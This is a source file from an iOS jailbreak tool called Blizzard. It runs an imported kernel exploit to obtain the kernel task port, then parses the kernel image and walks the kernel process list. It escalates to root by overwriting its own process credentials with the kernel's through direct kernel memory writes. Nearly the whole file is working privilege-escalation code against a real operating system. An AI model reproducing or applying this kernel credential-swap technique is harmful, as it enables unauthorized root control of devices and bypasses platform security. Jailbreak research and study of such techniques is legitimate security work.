//
//  blizzardJailbreak.c
//
//  Created by GeoSn0w on 8/10/20.
//  Copyright © 2020 GeoSn0w. All rights reserved.
//
#import <Foundation/Foundation.h>
#include "blizzardJailbreak.h"
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/mount.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include <spawn.h>
#include "BlizzardLog.h"
#import "../Exploits/Phoenix Exploit/exploit.h"
#import "../PatchFinder/patchfinder.h"
#import "../Kernel Tools/KernMemory.h"

mach_port_t kern_task = 0;
#define KERNEL_HEADER_SIZE (0x1000)
// serch __TEXT free area
kaddr_t text_vmaddr = 0;
size_t text_vmsize = 0;
kaddr_t text_text_sec_addr = 0;
size_t text_text_sec_size = 0;
kaddr_t text_const_sec_addr = 0;
size_t text_const_sec_size = 0;
kaddr_t text_cstring_sec_addr = 0;
size_t text_cstring_sec_size = 0;
kaddr_t text_os_log_sec_addr = 0;
size_t text_os_log_sec_size = 0;
kaddr_t data_vmaddr = 0;
size_t data_vmsize = 0;
kaddr_t KernelOffset(kaddr_t base, kaddr_t off);
kaddr_t allproc = 0;
static uint8_t *kdata = NULL;
static size_t ksize = 0;
static uint64_t kernel_entry = 0;
uint64_t kerndumpbase = -1;
static void *kernel_mh = 0;
// get root
uint32_t myProc;
uint32_t myUcred;

kaddr_t KernelOffset(kaddr_t base, kaddr_t off){
    if(!off) {
        return 0;
    }
    return base+off;
}

static int blizzardInitializeKernel(kaddr_t base) {
    unsigned i;
    uint8_t buf[KERNEL_HEADER_SIZE];
    const struct mach_header *hdr = (struct mach_header *)buf;
    const uint8_t *q;
    uint64_t min = -1;
    uint64_t max = 0;
    
    copyin(buf, base, sizeof(buf));
    q = buf + sizeof(struct mach_header) + 0;
    
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT) {
            const struct segment_command *seg = (struct segment_command *)q;
            if (min > seg->vmaddr) {
                min = seg->vmaddr;
            }
            if (max < seg->vmaddr + seg->vmsize) {
                max = seg->vmaddr + seg->vmsize;
            }
            if (!strcmp(seg->segname, "__TEXT")) {
                text_vmaddr = seg->vmaddr;
                text_vmsize = seg->vmsize;
                
                const struct section *sec = (struct section *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__text")) {
                        text_text_sec_addr = sec[j].addr;
                        text_text_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__const")) {
                        text_const_sec_addr = sec[j].addr;
                        text_const_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__cstring")) {
                        text_cstring_sec_addr = sec[j].addr;
                        text_cstring_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__os_log")) {
                        text_os_log_sec_addr = sec[j].addr;
                        text_os_log_sec_size = sec[j].size;
                    }
                }
            } else if (!strcmp(seg->segname, "__DATA")) {
                data_vmaddr = seg->vmaddr;
                data_vmsize = seg->vmsize;
            }
        }
        if (cmd->cmd == LC_UNIXTHREAD) {
            uint32_t *ptr = (uint32_t *)(cmd + 1);
            uint32_t flavor = ptr[0];
            struct {
                uint32_t    r[13];  /* General purpose register r0-r12 */
                uint32_t    sp;     /* Stack pointer r13 */
                uint32_t    lr;     /* Link register r14 */
                uint32_t    pc;     /* Program counter r15 */
                uint32_t    cpsr;   /* Current program status register */
            } *thread = (void *)(ptr + 2);
            if (flavor == 6) {
                kernel_entry = thread->pc;
            }
        }
        q = q + cmd->cmdsize;
    }
    
    kerndumpbase = min;
    ksize = max - min;
    
    kdata = malloc(ksize);
    if (!kdata) {
        return -1;
    }
    
    copyin(kdata, kerndumpbase, ksize);
    
    kernel_mh = kdata + base - min;
    return 0;
}

int blizzardGetTFP0(){
    printf("Blizzard is exploting the kernel...\n");
    exploit();
    kern_task  = tfp0;
    
    if (kern_task != 0){
        printf("Got tfp0: %0xllx\n", kern_task);
        blizzardInitializeKernel(KernelBase);
        printf("----- Getting ALLPROC -----");
        blizzardGetAllproc();
        printf("------------------------");
        printf("----- Getting ROOT -----");
        blizzardGetRoot();
        printf("------------------------");
    } else {
        printf("FAILED to obtain Kernel Task Port!\n");
    }
    return 0;
}

kaddr_t blizzardGetAllproc(){
    allproc = KernelOffset(KernelBase,find_allproc(KernelBase, kdata, ksize));
    
    if (allproc == 0){
        printf("Cannot retrieve ALLPROC!\n");
        return -1;
    }
    
    printf("[+] Successfully got AllProc: 0x%x\n", allproc);
    return allproc;
}

int blizzardGetRoot(){
    pid_t currentUserID = getuid();
    printf("[i] Current User ID: %d\n", getuid());
    vm_size_t sz = 4;
    
        if (currentUserID != 0){
            uint32_t kproc = 0;
            myProc = 0;
            myUcred = 0;
            pid_t mypid = getpid();
            uint32_t proc = 0;
            vm_read_overwrite(tfp0, allproc, sz, (vm_address_t)&proc, &sz);
            while (proc) {
                uint32_t pid = 0;
                vm_read_overwrite(tfp0, proc + 8, sz, (vm_address_t)&pid, &sz);
                if (pid == mypid) {
                    myProc = proc;
                } else if (pid == 0) {
                    kproc = proc;
                }
                vm_read_overwrite(tfp0, proc, sz, (vm_address_t)&proc, &sz);
            }
            vm_read_overwrite(tfp0, myProc + 0xa4, sz, (vm_address_t)&myUcred, &sz);
            uint32_t kcred = 0;
            vm_read_overwrite(tfp0, kproc + 0xa4, sz, (vm_address_t)&kcred, &sz);
            vm_write(tfp0, myProc + 0xa4, (vm_address_t)&kcred, sz);
            setuid(0);
            printf("[+] Got ROOT! Current User ID: %x\n", getuid());
            return 0;
        }
    return -1;
}
